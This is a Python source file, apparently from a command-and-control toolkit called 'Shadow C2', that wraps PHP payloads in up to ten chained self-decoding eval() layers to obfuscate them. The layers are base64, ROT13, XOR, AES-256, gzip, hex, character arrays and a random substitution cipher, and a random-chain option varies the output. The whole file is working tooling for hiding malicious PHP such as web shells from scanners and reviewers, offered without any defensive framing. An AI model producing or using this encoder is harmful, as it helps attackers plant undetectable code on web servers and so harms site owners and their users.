#!/usr/bin/env python3
"""
Shadow C2 — Multi-layer Encoding Chain
Each encoder wraps PHP code in a self-decoding layer.
Chainable: user picks 1-10 layers, applied in sequence.
Output is always valid, self-executing PHP.
"""

import base64
import zlib
import os
import random
import codecs
import string


class EncoderChain:
    """
    Multi-layer PHP payload encoder.
    Each layer wraps the previous in eval(decode(encoded_data)).
    """

    AVAILABLE_ENCODERS = [
        "base64", "rot13", "xor", "aes256", "gzip",
        "hex", "octal", "reverse", "chr_array", "custom_sub",
    ]

    def encode(self, php_code: str, layers: list) -> str:
        """
        Apply encoding layers in sequence.
        Each layer wraps the code in a self-decoding PHP eval().
        """
        # Strip <?php and ?> tags — we'll re-add at the end
        code = php_code.strip()
        if code.startswith("<?php"):
            code = code[5:].strip()
        if code.endswith("?>"):
            code = code[:-2].strip()

        for layer in layers:
            encoder = getattr(self, f"_encode_{layer}", None)
            if encoder:
                code = encoder(code)

        return f"<?php\n{code}\n?>"

    def random_chain(self, depth: int) -> list:
        """Generate a random encoding chain of given depth."""
        chain = []
        available = [e for e in self.AVAILABLE_ENCODERS if e != "aes256"]
        for _ in range(depth):
            chain.append(random.choice(available))
        # Always end with base64 for clean output
        if chain and chain[-1] != "base64":
            chain.append("base64")
        return chain

    # -- individual encoders -------------------------------------------------

    def _encode_base64(self, code: str) -> str:
        """Wrap in eval(base64_decode('...'))"""
        encoded = base64.b64encode(code.encode()).decode()
        return f"eval(base64_decode('{encoded}'));"

    def _encode_rot13(self, code: str) -> str:
        """Wrap in eval(str_rot13('...'))"""
        rotated = codecs.encode(code, 'rot_13')
        return f"eval(str_rot13('{self._escape_php(rotated)}'));"

    def _encode_xor(self, code: str) -> str:
        """XOR with random key, inject decoder loop."""
        key = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 16)))
        encrypted = ""
        for i, ch in enumerate(code):
            encrypted += f"\\x{ord(ch) ^ ord(key[i % len(key)]):02x}"

        return f"""$_k='{key}';$_d="{encrypted}";$_r='';$_kl=strlen($_k);
for($i=0;$i<strlen($_d);$i++)$_r.=chr(ord($_d[$i])^ord($_k[$i%$_kl]));
eval($_r);"""

    def _encode_aes256(self, code: str) -> str:
        """AES-256-CBC encrypt with openssl_decrypt() call."""
        key = os.urandom(32)
        iv = os.urandom(16)
        key_hex = key.hex()
        iv_hex = iv.hex()

        # We encode the data for the PHP side to decrypt
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding as sym_padding

        padder = sym_padding.PKCS7(128).padder()
        padded = padder.update(code.encode()) + padder.finalize()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        ct = encryptor.update(padded) + encryptor.finalize()
        ct_b64 = base64.b64encode(ct).decode()

        return f"""$_ct=base64_decode('{ct_b64}');
$_k=hex2bin('{key_hex}');
$_iv=hex2bin('{iv_hex}');
$_pt=openssl_decrypt($_ct,'aes-256-cbc',$_k,OPENSSL_RAW_DATA,$_iv);
eval($_pt);"""

    def _encode_gzip(self, code: str) -> str:
        """Gzip compress + base64, inject gzuncompress()."""
        compressed = zlib.compress(code.encode(), 9)
        encoded = base64.b64encode(compressed).decode()
        return f"eval(gzuncompress(base64_decode('{encoded}')));"

    def _encode_hex(self, code: str) -> str:
        """Hex-encode, inject hex2bin() decoder."""
        hex_data = code.encode().hex()
        return f"eval(hex2bin('{hex_data}'));"

    def _encode_octal(self, code: str) -> str:
        """Convert to octal char codes, inject chr() reconstruction."""
        parts = []
        for ch in code:
            parts.append(f"chr({ord(ch)})")
        # Split into chunks to avoid super-long lines
        chunk_size = 50
        chunks = [parts[i:i+chunk_size] for i in range(0, len(parts), chunk_size)]
        lines = []
        var = f"$_o{random.randint(10,99)}"
        lines.append(f"{var}='';")
        for chunk in chunks:
            lines.append(f"{var}.=" + ".".join(chunk) + ";")
        lines.append(f"eval({var});")
        return "\n".join(lines)

    def _encode_reverse(self, code: str) -> str:
        """Reverse string, inject strrev() + eval."""
        reversed_code = code[::-1]
        encoded = base64.b64encode(reversed_code.encode()).decode()
        return f"eval(strrev(base64_decode('{encoded}')));"

    def _encode_chr_array(self, code: str) -> str:
        """Convert each char to chr(N), concatenate."""
        chars = [str(ord(c)) for c in code]
        array_str = ",".join(chars)
        return f"""$_a=array({array_str});
$_s='';foreach($_a as $_c)$_s.=chr($_c);
eval($_s);"""

    def _encode_custom_sub(self, code: str) -> str:
        """Character substitution cipher with random mapping."""
        # Generate random substitution table
        chars = list(string.printable[:95])  # printable ASCII without whitespace control
        shuffled = chars.copy()
        random.shuffle(shuffled)

        forward_map = dict(zip(chars, shuffled))
        reverse_map = dict(zip(shuffled, chars))

        encoded = ""
        for ch in code:
            if ch in forward_map:
                encoded += forward_map[ch]
            else:
                encoded += ch

        # Build PHP reverse mapping
        php_map = "array("
        pairs = []
        for k, v in reverse_map.items():
            k_esc = self._escape_php_char(k)
            v_esc = self._escape_php_char(v)
            pairs.append(f"'{k_esc}'=>'{v_esc}'")
        php_map += ",".join(pairs) + ")"

        encoded_esc = self._escape_php(encoded)

        return f"""$_m={php_map};
$_e='{encoded_esc}';$_r='';
for($i=0;$i<strlen($_e);$i++){{
$_c=$_e[$i];$_r.=isset($_m[$_c])?$_m[$_c]:$_c;}}
eval($_r);"""

    # -- helpers -------------------------------------------------------------

    def _escape_php(self, s: str) -> str:
        """Escape single quotes for PHP strings."""
        return s.replace("\\", "\\\\").replace("'", "\\'")

    def _escape_php_char(self, ch: str) -> str:
        """Escape a single character for PHP."""
        if ch == "'":
            return "\\'"
        if ch == "\\":
            return "\\\\"
        return ch
